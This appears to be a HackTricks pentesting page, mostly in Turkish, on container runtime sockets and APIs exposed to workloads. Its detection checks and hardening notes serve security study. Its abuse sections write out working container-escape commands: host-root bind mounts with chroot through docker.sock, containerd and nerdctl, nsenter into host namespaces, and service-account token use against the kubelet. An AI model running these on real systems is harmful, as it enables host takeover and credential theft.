# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Birçok gerçek container compromise, hiç namespace escape ile başlamaz. Runtime control plane erişimiyle başlar. Bir workload `dockerd`, `containerd`, CRI-O, Podman veya kubelet ile bağlı bir Unix socket ya da exposed bir TCP listener üzerinden konuşabiliyorsa, attacker yeni bir container isteyebilir, host filesystem mount edebilir, host namespace'lerine katılabilir veya hassas node bilgilerini alabilir. Bu durumlarda runtime API gerçek güvenlik sınırıdır ve onu compromise etmek işlevsel olarak host'u compromise etmeye çok yakındır.

Bu yüzden runtime socket exposure, kernel protections'tan ayrı olarak belgelenmelidir. Sıradan seccomp, capabilities ve MAC confinement kullanan bir container, içinde `/var/run/docker.sock` veya `/run/containerd/containerd.sock` mount edilmişse yine de host compromise'a bir API call uzaklıkta olabilir. Mevcut container'ın kernel isolation'ı tam da tasarlandığı gibi çalışıyor olabilirken runtime management plane tamamen exposed kalabilir.

## Daemon Access Models

Docker Engine geleneksel olarak yetkili API'sini yerel Unix socket üzerinden `unix:///var/run/docker.sock` ile expose eder. Tarihsel olarak ayrıca `tcp://0.0.0.0:2375` gibi TCP listener'lar üzerinden veya `2376` üzerinde TLS-protected bir listener ile de expose edilmiştir. Daemon'u güçlü TLS ve client authentication olmadan uzaktan expose etmek, Docker API'yi etkili biçimde remote root interface'e çevirir.

containerd, CRI-O, Podman ve kubelet benzer high-impact yüzeyler expose eder. İsimler ve workflows farklıdır, ama mantık değildir. Eğer interface çağıran kişinin workload oluşturmasına, host path'leri mount etmesine, credentials almasına veya çalışan containers'ları değiştirmesine izin veriyorsa, interface privileged bir management channel'dır ve buna göre ele alınmalıdır.

Kontrol etmeye değer yaygın local yollar şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha özelleşmiş stack'ler ayrıca `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi endpoint'leri de expose edebilir. Bunlar modern ortamlarda daha az yaygındır, ancak karşılaşıldıklarında aynı dikkatle ele alınmalıdır çünkü sıradan application socket'leri değil, runtime-control surface'lerini temsil ederler.

## Secure Remote Access

Eğer bir daemon local socket'in ötesinde expose edilmek zorundaysa, bağlantı TLS ile korunmalı ve tercihen mutual authentication kullanılmalıdır; böylece daemon client'ı doğrular ve client da daemon'u doğrular. Docker daemon'unu kolaylık olsun diye düz HTTP üzerinde açma eski alışkanlığı, container administration içindeki en tehlikeli hatalardan biridir çünkü API surface'i doğrudan privileged container'lar oluşturacak kadar güçlüdür.

Tarihsel Docker configuration pattern'i şöyle görünürdü:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd tabanlı host’larda, daemon iletişimi `fd://` olarak da görünebilir; bu, process’in socket’i doğrudan kendisinin bind etmesi yerine systemd’den önceden açılmış bir socket’i devraldığı anlamına gelir. Önemli ders tam syntax değil, security sonucudur. Daemon, sıkı şekilde izin verilmiş local socket’in ötesinde dinlemeye başladığı anda, transport security ve client authentication isteğe bağlı hardening olmaktan çıkar ve zorunlu hale gelir.

## Abuse

Eğer bir runtime socket varsa, hangisi olduğunu, uyumlu bir client olup olmadığını ve raw HTTP ya da gRPC access mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Bu komutlar kullanışlıdır çünkü ölü bir path, bağlı ama erişilemeyen bir socket ve canlı bir ayrıcalıklı API arasındaki farkı ayırt eder. İstemci başarılı olursa, sonraki soru API’nin host bind mount veya host namespace sharing ile yeni bir container başlatıp başlatamayacağıdır.

### When No Client Is Installed

`docker`, `podman` veya başka bir dostane CLI’nın olmaması socket’in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket üzerinden HTTP konuşur ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de yerel bir Libpod-native API sunar. Bu da yalnızca `curl` bulunan minimal bir ortamın bile daemon’ı kontrol etmek için yeterli olabileceği anlamına gelir:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Bu, post-exploitation sırasında önemlidir çünkü defenders bazen normal client binary’lerini kaldırır ama management socket’i mounted halde bırakır. Podman host’larında, yüksek değerli path’in rootful ve rootless deployment’lar arasında farklı olduğunu unutmayın: rootful service instances için `unix:///run/podman/podman.sock`, rootless olanlar için `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Full Example: Docker Socket To Host Root

Eğer `docker.sock` reachable ise, klasik escape; host root filesystem’ini mount eden yeni bir container başlatmak ve ardından içine `chroot` yapmak olur:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon üzerinden doğrudan host-root execution sağlar. Etki yalnızca dosya okumayla sınırlı değildir. Yeni container içine girdikten sonra saldırgan host dosyalarını değiştirebilir, credentials toplayabilir, persistence yerleştirebilir veya ek privileged workloads başlatabilir.

### Full Example: Docker Socket To Host Namespaces

Eğer saldırgan filesystem-only access yerine namespace entry tercih ederse:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, çalışma zamanından mevcut olanı istismar etmek yerine açık host-namespace exposure ile yeni bir container oluşturmasını isteyerek host’a ulaşır.

### Full Example: containerd Socket

Mount edilmiş bir `containerd` socket genellikle aynı derecede tehlikelidir:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Daha Docker benzeri bir client varsa, `nerdctl`, `ctr`’dan daha kullanışlı olabilir çünkü `--privileged`, `--pid=host` ve `-v` gibi tanıdık flags sunar:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Etki yine host compromise’dır. Docker’a özgü tooling olmasa bile, başka bir runtime API yine aynı administrative power’ı sağlayabilir. Kubernetes node’larında `crictl`, CRI endpoint’ine doğrudan konuştuğu için reconnaissance ve container interaction açısından da yeterli olabilir.

### BuildKit Socket

`buildkitd`, insanların onu sıklıkla "sadece build backend" olarak düşünmesi nedeniyle kolayca gözden kaçar, ancak daemon hâlâ privileged bir control plane’dir. Erişilebilir bir `buildkitd.sock`, bir saldırganın arbitrary build steps çalıştırmasına, worker capabilities’lerini incelemesine, compromised environment içindeki local contexts’i kullanmasına ve daemon bunlara izin verecek şekilde yapılandırıldıysa `network.host` veya `security.insecure` gibi dangerous entitlements istemesine olanak tanıyabilir.

Useful first interactions are:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Eğer daemon build isteklerini kabul ediyorsa, insecure entitlements olup olmadığını test edin:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Kesin etki daemon yapılandırmasına bağlıdır, ancak permissive entitlement’lara sahip rootful bir BuildKit service zararsız bir developer convenience değildir. Bunu başka bir yüksek değerli administrative surface olarak değerlendirin, özellikle CI runner’larda ve shared build node’larda.

### Kubelet API Over TCP

kubelet bir container runtime değildir, ancak yine de node management plane’in bir parçasıdır ve çoğu zaman aynı trust boundary tartışmasının içinde yer alır. Eğer kubelet secure port `10250` workload tarafından erişilebilir durumdaysa veya node credentials, kubeconfigs ya da proxy rights ifşa olmuşsa, attacker Kubernetes API server admission path’e hiç dokunmadan Pods’u enumerate edebilir, logs alabilir veya node-local container’larda komut çalıştırabilir.

Ucuz keşifle başlayın:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Eğer kubelet veya API-server proxy yolu `exec` yetkilendiriyorsa, WebSocket destekli bir istemci bunu aynı node üzerindeki diğer container'larda code execution'a dönüştürebilir. `nodes/proxy` için yalnızca `get` izninin göründüğünden daha tehlikeli olmasının nedeni de budur: istek yine de komut çalıştıran kubelet endpoint'lerine ulaşabilir ve bu doğrudan kubelet etkileşimleri normal Kubernetes audit logs içinde görünmez.

## Checks

Bu kontrollerin amacı, container'ın trust boundary dışında kalması gereken herhangi bir management plane'e ulaşıp ulaşamadığını cevaplamaktır.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Burada ilginç olan:

- Mount edilmiş bir runtime socket genellikle yalnızca bilgi sızması değil, doğrudan bir yönetimsel ilkel olarak kullanılabilir.
- `2375` üzerinde TLS olmadan bir TCP listener, uzaktan ele geçirme durumu olarak ele alınmalıdır.
- `DOCKER_HOST` gibi environment variables, iş yükünün bilinçli olarak host runtime ile konuşacak şekilde tasarlandığını sıkça ortaya çıkarır.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak local Unix socket | `dockerd` local socket üzerinde dinler ve daemon genellikle rootful'dur | `/var/run/docker.sock` mount etmek, `tcp://...:2375` açığa çıkarmak, `2376` üzerinde zayıf veya eksik TLS |
| Podman | Varsayılan olarak daemonless CLI | Normal local kullanım için uzun ömürlü ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API sockets yine de açığa çıkabilir | `podman.sock` açığa çıkarmak, service'i geniş kapsamda çalıştırmak, rootful API kullanımı |
| containerd | Local privileged socket | Administrative API local socket üzerinden açığa çıkar ve genellikle daha üst seviye araçlar tarafından kullanılır | `containerd.sock` mount etmek, geniş `ctr` veya `nerdctl` erişimi, privileged namespaces açığa çıkarmak |
| CRI-O | Local privileged socket | CRI endpoint'i node-local trusted components için tasarlanmıştır | `crio.sock` mount etmek, CRI endpoint'ini untrusted workloads'a açmak |
| Kubernetes kubelet | Node-local management API | Kubelet, Pods tarafından geniş şekilde erişilebilir olmamalıdır; erişim, authn/authz'ye bağlı olarak pod state, credentials ve execution features açığa çıkarabilir | kubelet sockets veya cert'leri mount etmek, zayıf kubelet auth, host networking ile erişilebilir kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
